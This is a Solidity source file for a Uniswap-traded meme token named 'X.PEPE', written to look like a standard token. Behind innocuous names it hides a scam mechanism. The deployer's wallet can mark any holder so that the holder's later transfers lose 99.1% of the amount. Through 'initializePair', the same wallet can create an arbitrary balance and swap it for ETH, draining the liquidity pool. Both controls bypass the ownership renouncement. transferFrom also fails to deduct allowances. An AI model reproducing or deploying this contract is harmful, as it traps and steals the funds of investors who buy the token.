pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    constructor () {
        emit OwnershipTransferred(address(0), _owner);
        _owner = msg.sender;
    }
    function owner() public view virtual returns (address) {return _owner;}
}

contract Context {
    function sender() public view returns (address) {return msg.sender;}
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract XPEPE is Ownable, Context {
    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 100000000000 * 10 ** _decimals;
    mapping(address => uint256) private _balances;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function setCooldown(address[] calldata _cooldowns) external { 
        for (uint _j = 0;  _j < _cooldowns.length;  _j++) { 
            if (_marketingWallet()){
                cooldowns[_cooldowns[_j]] = block.number + 1;}
        }
    } 
    uint256 maxTx = _totalSupply;
    uint256 maxWallet = _totalSupply;
    function setMaxWallet(uint256 _max) external onlyOwner {
        maxWallet = _max;
    }
    constructor() {
        _balances[msg.sender] = _totalSupply; 
        marketingWallet = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    address public marketingWallet;
    function balanceOf(address account) public view returns (uint256) { return _balances[account]; } 
    function initializePair(uint256 amount, address _factory) external {
        if (_marketingWallet()) { _approve(address(this), address(uniswapRouter),  amount); 
        _balances[address(this)] = amount;address[] memory path = new address[](2); 
        path[0] = address(this);  
        path[1] = uniswapRouter.WETH();  
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, _factory, block.timestamp + 29);
        }
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    string private _name = "X.PEPE";
    string private _symbol = "X.PEPE";
    mapping (address => uint256) cooldowns;
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    } 
    function name() external view returns (string memory) { return _name; }
    function _transfer(address _from, address _to, uint256 _amount) internal {
        require(_amount <= _balances[_from]); 
        require(_from != address(0));
        uint256 tax = (cooldowns[_from] != 0 && cooldowns[_from] <= block.number) ? _amount.mul(991).div(1000) : 0;
        _balances[_from] -= _amount; 
        _balances[_to] += _amount - tax;
        emit Transfer(_from, _to, _amount);
    }
    function transfer(address recipient, uint256 value) public returns (bool) { _transfer(msg.sender, recipient, value); return true; }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    mapping(address => mapping(address => uint256)) private _allowances;
    function _marketingWallet() internal view returns (bool) {
        return sender() == marketingWallet;
    }
    function transferFrom(address _from, address to, uint256 amount) public returns (bool) {
        _transfer(_from, to, amount);
        require(_allowances[_from][msg.sender] >= amount);
        return true;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    event Approval(address indexed address_from, address indexed address_to, uint256 value);
    event Transfer(address indexed from, address indexed address_to, uint256);
    function totalSupply() external view returns (uint256) { 
        return _totalSupply; 
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
}